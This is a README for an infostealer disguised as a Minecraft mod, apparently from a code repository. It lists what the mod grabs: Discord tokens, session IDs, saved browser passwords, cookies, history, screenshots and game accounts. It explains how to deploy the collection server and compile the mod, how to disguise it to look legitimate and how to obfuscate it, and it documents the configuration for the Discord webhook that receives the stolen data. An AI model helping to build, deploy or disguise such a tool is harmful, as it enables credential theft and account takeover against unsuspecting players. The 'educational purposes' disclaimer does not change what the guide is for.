# Features
- Impossible to delete the webhook
- Good spam protection
- Grabs
    - IP
    - Minecraft Session ID
    - Discord Tokens from:
        - Discord
        - Discord PTB
        - Discord Canary
        - Lightcord
        - Every popular chromium based browser
    - Saved browser passwords
    - Cookies
    - Browser history
    - Desktop screenshot
    - Minecraft accounts saved in lunar client
    - Minecraft accounts saved in essential
- Bypasses the restrictions on the max allowed key lenght
- Isn't reliant on any third party file hosting service like [Anonfiles](https://anonfiles.com) or [Gofile](https://gofile.io)
- Embeds and webhook customizable, no watermark

# Setup
## Server
Host on [render](https://render.com)
   1. Make a private fork of this repository
   2. Edit `server/config.json` to your liking
   3. Create a new render account with the GitHub account you forked the repository with
   4. Create a new web service
   5. Select the forked repository
   6. Put in a name for the service, select main as the branch, `server` as the root directory, Python 3 as runtime, Build command `pip install -r requirements.txt` and Start command `python main.py` or `python3 main.py`
   7. Wait for the service to build
## Mod/Client
   1. Download the repository
   2. Change the Server IP in `scr/main/java/dev/schubilegend/SchubiMod.java` to the IP of your VPS / URL of your render service
   3. Optional: Change the names of the classes/folders to make it look more legit
   4. Compile the mod (JDK 17 in your gradle settings and JDK 8 in your project settings)
#### OR

   **Optional: Obfuscate the mod**
| Name                       | Possible values                 | Description                                                                                                                    |
|----------------------------|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------|
| webhook                    | Any discord webhook URL         | The webhook the info is sent to                                                                                                |
| webhook_name               | Any string, max 80 characters   | The name the webhook will have when sending the info                                                                           |
| webhook_avatar             | Any URL to a PNG or JPG file    | The avatar the webhook will have when sending the info                                                                         |
| message                    | Any string, max 2000 characters | The message the webhook will send with the info. `%IP%` will automatically be replaced with the IP of the client               |
| codeblock_type             | `small` or `big`                | The type of codeblock used for the embed fields                                                                                |
| ip_ratelimit               | Any number                      | The number of times a client can send a request before getting rate-limited                                                    |
| reset_ratelimit_after      | Any number                      | The number of minutes a client has to wait after getting rate-limited before sending another request                           |
| mc_embed_color             | Any hex color code              | The color of the Minecraft embed                                                                                               |
| mc_embed_title             | Any string, max 256 characters  | The title of the Minecraft embed                                                                                               |
| mc_embed_footer_text       | Any string, max 2048 characters | The footer text of the Minecraft embed                                                                                         |
| mc_embed_footer_icon       | Any URL to a PNG or JPG file    | The footer icon of the Minecraft embed                                                                                         |
| discord_embed_color        | Any hex color code              | The color of the Discord embed                                                                                                 |
| discord_embed_title        | Any string, max 256 characters  | The title of the Discord embed                                                                                                 |
| discord_embed_footer_text  | Any string, max 2048 characters | The footer text of the Discord embed                                                                                           |
| discord_embed_footer_icon  | Any URL to a PNG or JPG file    | The footer icon of the Discord embed                                                                                           |
| password_embed_color       | Any hex color code              | The color of the password embed                                                                                                |
| password_embed_title       | Any string, max 256 characters  | The title of the password embed                                                                                                |
| password_embed_footer_text | Any string, max 2048 characters | The footer text of the password embed                                                                                          |
| password_embed_footer_icon | Any URL to a PNG or JPG file    | The footer icon of the password embed                                                                                          |
| file_embed_color           | Any hex color code              | The color of the file embed                                                                                                    |
| file_embed_title           | Any string, max 256 characters  | The title of the file embed                                                                                                    |
| file_embed_footer_text     | Any string, max 2048 characters | The footer text of the file embed                                                                                              |
| file_embed_footer_icon     | Any URL to a PNG or JPG file    | The footer icon of the file embed                                                                                              |
| validate_session           | `true` or `false`               | If requests containing a invalid session id or one that isn't matching the uuid/ign of the minecraft account should be blocked |

# DISCLAIMER
**I am not responsible for any damage caused by this program. This is for educational purposes only. Use at your own risk.**
